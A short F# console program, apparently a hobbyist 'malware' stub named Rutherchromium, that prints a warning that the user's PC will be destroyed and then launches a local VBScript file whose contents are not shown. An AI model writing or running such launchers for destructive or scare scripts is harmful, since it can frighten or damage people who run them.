open System.Diagnostics

[<EntryPoint>]
let main argv =
    let processoVBS = "warningversion.vbs"
    
    printfn "NOW, YOUR PC GOES TO BE DESTROYED BY RUTHERCHORMIUM"
    
    try
        Process.Start(processoVBS) |> ignore
        printfn "Starting Rutherchromium"
    with
    | ex -> printfn "Error for Rutherchromium: %s" ex.Message

    0